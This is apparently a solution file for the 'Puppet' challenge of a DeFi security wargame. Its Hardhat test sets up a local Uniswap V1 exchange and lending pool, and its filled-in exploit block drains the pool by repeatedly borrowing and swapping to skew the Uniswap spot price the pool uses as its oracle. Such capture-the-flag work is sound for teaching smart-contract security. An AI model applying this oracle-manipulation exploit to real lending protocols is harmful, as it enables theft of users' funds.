const exchangeJson = require('../../build-uniswap-v1/UniswapV1Exchange.json');
const factoryJson = require('../../build-uniswap-v1/UniswapV1Factory.json');

const { ethers, web3 } = require('hardhat');
const { expect } = require('chai');
const { BigNumber } = require('ethers');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
	tokensSold,
	tokensInReserve,
	etherInReserve,
) {
	return tokensSold
		.mul(ethers.BigNumber.from('997'))
		.mul(etherInReserve)
		.div(
			tokensInReserve
				.mul(ethers.BigNumber.from('1000'))
				.add(tokensSold.mul(ethers.BigNumber.from('997'))),
		);
}

describe('[Challenge] Puppet', function () {
	let deployer, attacker;

	// Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
	const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
	const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

	const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
	const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
	const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, attacker] = await ethers.getSigners();

		const UniswapExchangeFactory = new ethers.ContractFactory(
			exchangeJson.abi,
			exchangeJson.evm.bytecode,
			deployer,
		);
		const UniswapFactoryFactory = new ethers.ContractFactory(
			factoryJson.abi,
			factoryJson.evm.bytecode,
			deployer,
		);

		const DamnValuableTokenFactory = await ethers.getContractFactory(
			'DamnValuableToken',
			deployer,
		);
		const PuppetPoolFactory = await ethers.getContractFactory(
			'PuppetPool',
			deployer,
		);

		await ethers.provider.send('hardhat_setBalance', [
			attacker.address,
			'0x15af1d78b58c40000', // 25 ETH
		]);
		expect(await ethers.provider.getBalance(attacker.address)).to.equal(
			ATTACKER_INITIAL_ETH_BALANCE,
		);

		// Deploy token to be traded in Uniswap
		this.token = await DamnValuableTokenFactory.deploy();

		// Deploy a exchange that will be used as the factory template
		this.exchangeTemplate = await UniswapExchangeFactory.deploy();

		// Deploy factory, initializing it with the address of the template exchange
		this.uniswapFactory = await UniswapFactoryFactory.deploy();
		await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

		// Create a new exchange for the token, and retrieve the deployed exchange's address
		let tx = await this.uniswapFactory.createExchange(this.token.address, {
			gasLimit: 1e6,
		});
		const { events } = await tx.wait();
		this.uniswapExchange = await UniswapExchangeFactory.attach(
			events[0].args.exchange,
		);

		// Deploy the lending pool
		this.lendingPool = await PuppetPoolFactory.deploy(
			this.token.address,
			this.uniswapExchange.address,
		);

		// Add initial token and ETH liquidity to the pool
		await this.token.approve(
			this.uniswapExchange.address,
			UNISWAP_INITIAL_TOKEN_RESERVE,
		);
		await this.uniswapExchange.addLiquidity(
			0, // min_liquidity
			UNISWAP_INITIAL_TOKEN_RESERVE,
			(await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
			{ value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 },
		);

		// Ensure Uniswap exchange is working as expected
		expect(
			await this.uniswapExchange.getTokenToEthInputPrice(
				ethers.utils.parseEther('1'),
				{ gasLimit: 1e6 },
			),
		).to.be.eq(
			calculateTokenToEthInputPrice(
				ethers.utils.parseEther('1'),
				UNISWAP_INITIAL_TOKEN_RESERVE,
				UNISWAP_INITIAL_ETH_RESERVE,
			),
		);

		// Setup initial token balances of pool and attacker account
		await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
		await this.token.transfer(
			this.lendingPool.address,
			POOL_INITIAL_TOKEN_BALANCE,
		);

		// Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
		expect(
			await this.lendingPool.calculateDepositRequired(
				ethers.utils.parseEther('1'),
			),
		).to.be.eq(ethers.utils.parseEther('2'));
	});

	it('Exploit', async function () {
		/** CODE YOUR EXPLOIT HERE */
		// reserve 1 eth for gas fee
		const ETH_MANTISSA = BigNumber.from(10).pow(18);
		let INITIAL_ETH = ethers.utils.parseEther('20');

		const computeOraclePrice = async () => {
			const ethBalance = await ethers.provider.getBalance(
				this.uniswapExchange.address,
			);

			const tokenBalance = await this.token.balanceOf(
				this.uniswapExchange.address,
			);

			return ethBalance.mul(ETH_MANTISSA).div(tokenBalance);
		};

		const getDeadline = async () => {
			const block = await web3.eth.getBlock('latest');
			return block.timestamp + 300;
		};

		await this.token
			.connect(attacker)
			.approve(this.uniswapExchange.address, BigNumber.from(2).pow(256).sub(1));

		let poolBalance = await this.token.balanceOf(this.lendingPool.address);

		// borrow => swap
		// collateral will be decrease after each swap since eth_reserve / token_reserve will goes down in each iteration
		// loop until pool balance reach zero
		while (poolBalance.gt(BigNumber.from(0))) {
			let price = await computeOraclePrice();
			const borrowToken = INITIAL_ETH.mul(ETH_MANTISSA).div(price.mul(2));

			const borrowAmount = borrowToken.gte(poolBalance)
				? poolBalance
				: borrowToken;

			const depositRequired = await this.lendingPool.calculateDepositRequired(
				borrowToken,
			);

			await this.lendingPool
				.connect(attacker)
				.borrow(borrowAmount, { value: depositRequired });

			const balanceAttacker = await this.token.balanceOf(attacker.address);

			const deadline = await getDeadline();

			await this.uniswapExchange
				.connect(attacker)
				.tokenToEthSwapInput(
					balanceAttacker,
					ethers.utils.parseEther('0.000001'),
					deadline,
				);

			INITIAL_ETH = (await ethers.provider.getBalance(attacker.address))
				.mul(80)
				.div(100);

			poolBalance = await this.token.balanceOf(this.lendingPool.address);
		}

		const deadline = await getDeadline();

		const ethReserve = await ethers.provider.getBalance(
			this.uniswapExchange.address,
		);

		const tokenReserve = await this.token.balanceOf(
			this.uniswapExchange.address,
		);

		// swap eth for token
		// token_out = eth_in * token_reserve / eth_reserve
		// we will gain lot of tokens since eth_reserve << token_reserve
		const outToken = calculateTokenToEthInputPrice(
			INITIAL_ETH,
			ethReserve,
			tokenReserve,
		);
		const swapAmount = outToken.gte(tokenReserve) ? tokenReserve : outToken;
		await this.uniswapExchange
			.connect(attacker)
			.ethToTokenSwapOutput(swapAmount, deadline, {
				value: INITIAL_ETH,
			});
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker has taken all tokens from the pool
		expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0');
		expect(await this.token.balanceOf(attacker.address)).to.be.gt(
			POOL_INITIAL_TOKEN_BALANCE,
		);
	});
});
